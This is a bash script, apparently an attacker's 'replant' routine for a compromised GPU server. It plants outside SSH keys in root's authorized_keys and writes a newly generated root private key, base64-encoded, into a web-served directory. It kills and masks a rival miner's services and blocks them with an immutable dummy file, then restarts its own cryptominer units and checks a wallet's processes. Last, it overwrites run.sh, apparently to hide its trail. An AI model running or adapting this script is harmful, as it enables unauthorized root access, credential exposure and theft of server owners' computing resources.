#!/bin/bash
# ul7466 replant: reclaim g0023 root channel, kill plh, restore our plant (idempotent)
exec 9>/var/lock/ul7466r.lock; flock -n 9 || exit 0
W=/opt/t19/www; OUT=$W/ul7466_replant.txt
{
echo "=== REPLANT $(date -u +%FT%TZ) ==="
id; hostname; uptime -b
mkdir -p /root/.ssh; chmod 700 /root/.ssh; touch /root/.ssh/authorized_keys; chattr -i /root/.ssh/authorized_keys 2>/dev/null
K1='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMNt5Z3qbsp46RAfAf1BxL3Fg0JHo9JUqtP9cKNVh/cp ul7466-owner1'
K2='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMAdZRZegdhDMlj+F6IkgyNHO8CPsINpCjC96WfPeFqm ul7466-owner2'
for K in "$K1" "$K2"; do b=$(echo "$K"|awk '{print $2}'); grep -qF "$b" /root/.ssh/authorized_keys || echo "$K" >> /root/.ssh/authorized_keys; done
[ -f /root/.ssh/ul7466_new ] || ssh-keygen -t ed25519 -N '' -C ul7466 -f /root/.ssh/ul7466_new >/dev/null 2>&1
b=$(cut -d' ' -f2 /root/.ssh/ul7466_new.pub 2>/dev/null); [ -n "$b" ] && { grep -qF "$b" /root/.ssh/authorized_keys || cat /root/.ssh/ul7466_new.pub >> /root/.ssh/authorized_keys; }
chmod 600 /root/.ssh/authorized_keys; base64 -w0 /root/.ssh/ul7466_new > $W/ul7466_newkey.b64 2>/dev/null
for u in $(systemctl list-unit-files --no-legend 2>/dev/null | awk '{print $1}' | grep -i plh); do systemctl disable --now "$u" >/dev/null 2>&1; systemctl mask "$u" >/dev/null 2>&1; done
pkill -9 -f plh-keeper 2>/dev/null; pkill -9 -f krig-miner 2>/dev/null; pkill -9 -f '/usr/local/lib/.plh' 2>/dev/null; pkill -9 -f '.plhm' 2>/dev/null
chattr -R -i /opt/plh /opt/plhllm /usr/local/lib/.plh 2>/dev/null; rm -rf /opt/plh /opt/plhllm /usr/local/lib/.plh /usr/local/bin/.plhm /etc/cron.d/plh* 2>/dev/null
printf '#!/bin/bash\nexit 0\n' > /usr/local/bin/.plhm; chmod 755 /usr/local/bin/.plhm; chattr +i /usr/local/bin/.plhm 2>/dev/null
sed -i '/plh\|keepalive.sh\|keeper.sh/d' /var/spool/cron/root /var/spool/cron/crontabs/root /etc/crontab 2>/dev/null
echo "--- restore our units ---"
ls /etc/systemd/system/ | grep -E 'ul|card' | head -30
for i in 0 1 2 3 4 5 6 7; do for u in ul-card@$i ul2-card@$i; do [ -f /etc/systemd/system/$u.service ] && systemctl enable --now $u >/dev/null 2>&1 && echo "started $u"; done; done
[ -x /root/ul_plant/keep.sh ] && { setsid nohup /root/ul_plant/keep.sh >/dev/null 2>&1 & echo "keep.sh launched"; }
sleep 6
echo "--- STATE ---"; ps -eo pid,args= | grep -iE 'wildrig|peakminer|srbminer|krig|plh' | grep -v grep | head -20
echo "our wallet procs: $(pgrep -fc prl1pek8)"; echo "krig procs: $(pgrep -fc krig-miner)"
nvidia-smi -L 2>&1 | head -10
echo "=== DONE7466 REPLANT $(date -u +%FT%TZ) ==="
} > $OUT 2>&1
printf '#!/bin/bash\nexit 0\n' > $W/run2.sh; chmod 644 $W/run2.sh; mv -f $W/run2.sh $W/run.sh; chmod 644 $OUT
